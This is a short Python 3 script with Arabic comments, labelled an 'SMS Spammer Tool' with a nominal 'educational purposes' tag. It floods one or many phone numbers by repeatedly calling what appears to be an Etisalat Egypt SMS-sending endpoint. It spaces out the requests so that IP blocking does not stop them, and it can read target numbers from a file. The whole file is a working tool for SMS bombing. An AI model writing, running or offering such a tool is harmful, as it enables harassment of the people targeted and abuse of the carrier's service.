#!/usr/bin/python3
# المطور الأصلي: KendoClaw1
# التحديث لـ Python 3 بواسطة: محمود أبو الفضل (AboElfadl Media)

import argparse
import requests
from time import sleep

# تنسيق الواجهة بشكل احترافي
BANNER = """
#################################
#                               #
#      SMS Spammer Tool         #
#      Refactored for Py3       #
#      By: KendoClaw1           #
#                               #
#################################
"""

def sendsms(number):
    # تم وضع رابط تخيلي للتوضيح
    url = "https://etisalat.eg/api/sms/send" 
    params = {'dial': number, 'lang': 'ar'}
    headers = {
        'Host': 'etisalat.eg',
        'Content-Type': 'application/json;charset=utf-8',
        'X-TS-AJAX-Request': 'True',
        'User-Agent': 'Mozilla/5.0'
    }
    payload = {"dial": number, "lang": "ar", "timeStamp": "timeStamp"}
    
    try:
        req = requests.post(url, params=params, headers=headers, json=payload, timeout=10)
        print(f"[+] Status Code: {req.status_code}") # استخدام f-strings في Python 3
    except Exception as e:
        print(f"[-] Error: {e}")

def onenumber(phonenumber, howmanysms):
    print(f"Sending {howmanysms} SMS's to {phonenumber}, please wait...")
    for x in range(1, howmanysms + 1):
        sendsms(phonenumber)
        print(f"[*] {x} SMS sent")
        sleep(3) # لتجنب حظر الـ IP أو الضغط على الخادم
    print("Done.")

def loadfromfile(file_path, howmanysms):
    try:
        with open(file_path, 'r') as file:
            numbers = [line.strip() for line in file if line.strip()]
        
        for number in numbers:
            print(f"\n--- Targeting: {number} ---")
            onenumber(number, howmanysms)
    except FileNotFoundError:
        print("[-] Error: File not found.")

def main():
    print(BANNER)
    print("To stop the script Press CTRL + C\n")

    parser = argparse.ArgumentParser(description="SMS Spammer Tool for Educational Purposes")
    parser.add_argument("-p", help="PhoneNumber to send SMS to.", metavar="PhoneNumber")
    parser.add_argument("-n", help="Number of SMS's to send (Default = 20)", type=int, default=20, metavar="NumOfSMS")
    parser.add_argument("-f", help="Load a list of numbers from a file (Optional)", metavar="file.txt")
    
    args = parser.parse_args()

    try:
        if args.f:
            loadfromfile(args.f, args.n)
        elif args.p:
            onenumber(args.p, args.n)
        else:
            parser.print_help()
    except KeyboardInterrupt:
        print("\n[!] Script stopped by user.")

if __name__ == "__main__":
    main()